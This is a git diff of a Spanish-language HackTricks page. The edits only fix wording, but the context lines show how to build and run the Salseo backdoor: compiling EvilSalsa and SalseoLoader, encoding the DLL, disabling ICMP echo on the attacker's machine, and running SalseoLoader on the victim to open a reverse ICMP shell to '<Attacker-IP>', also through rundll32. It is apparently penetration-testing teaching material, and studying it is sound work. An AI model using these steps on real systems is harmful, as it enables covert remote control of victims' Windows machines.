@@ -6,7 +6,7 @@
 
 Otras formas de apoyar a HackTricks:
 
-* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
@@ -16,11 +16,11 @@ Otras formas de apoyar a HackTricks:
 
 ## Compilando los binarios
 
-Descarga el código fuente desde github y compila **EvilSalsa** y **SalseoLoader**. Necesitarás **Visual Studio** instalado para compilar el código.
+Descarga el código fuente desde github y compila **EvilSalsa** y **SalseoLoader**. Necesitarás tener **Visual Studio** instalado para compilar el código.
 
-Compila esos proyectos para la arquitectura de la caja de Windows donde los vas a usar (si Windows soporta x64, compílalos para esas arquitecturas).
+Compila esos proyectos para la arquitectura de la caja de Windows donde los vas a usar (si Windows soporta x64, compílalos para esa arquitectura).
 
-Puedes **seleccionar la arquitectura** dentro de Visual Studio en la pestaña **"Build"** a la izquierda en **"Platform Target".**
+Puedes **seleccionar la arquitectura** dentro de Visual Studio en la pestaña **"Build"** a la izquierda, en **"Platform Target".**
 
 (**Si no encuentras estas opciones, presiona en la pestaña "Project"** y luego en **"\<Project Name> Properties"**)
 
@@ -32,7 +32,7 @@ Luego, construye ambos proyectos (Build -> Build Solution) (Dentro de los regist
 
 ## Preparar el Backdoor
 
-Primero que todo, necesitarás codificar el **EvilSalsa.dll.** Para hacerlo, puedes usar el script de python **encrypterassembly.py** o puedes compilar el proyecto **EncrypterAssembly**:
+Primero que todo, necesitarás codificar **EvilSalsa.dll.** Para hacerlo, puedes usar el script de python **encrypterassembly.py** o puedes compilar el proyecto **EncrypterAssembly**:
 
 ### **Python**
 ```
@@ -77,7 +77,7 @@ sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
-#### Dentro de la víctima, ejecutemos la cosa del salseo:
+#### Dentro de la víctima, ejecutemos el asunto salseo:
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
@@ -87,17 +87,17 @@ Abre el proyecto SalseoLoader usando Visual Studio.
 
 ### Añade antes de la función principal: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Instala DllExport para este proyecto
 
 #### **Herramientas** --> **Administrador de Paquetes NuGet** --> **Administrar Paquetes NuGet para la Solución...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 #### **Busca el paquete DllExport (usando la pestaña Examinar), y presiona Instalar (y acepta el popup)**
 
-![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 En la carpeta de tu proyecto han aparecido los archivos: **DllExport.bat** y **DllExport\_Configure.bat**
 
@@ -129,7 +129,7 @@ Selecciona **Tipo de Salida = Biblioteca de Clases** (Proyecto --> Propiedades d
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-Selecciona la **plataforma x64** (Proyecto --> Propiedades de SalseoLoader --> Compilación --> Objetivo de la plataforma = x64)
+Selecciona **plataforma x64** (Proyecto --> Propiedades de SalseoLoader --> Compilar --> Objetivo de la plataforma = x64)
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
@@ -173,10 +173,10 @@ rundll32.exe SalseoLoader.dll,main
 
 Otras formas de apoyar a HackTricks:
 
-* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
 * **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
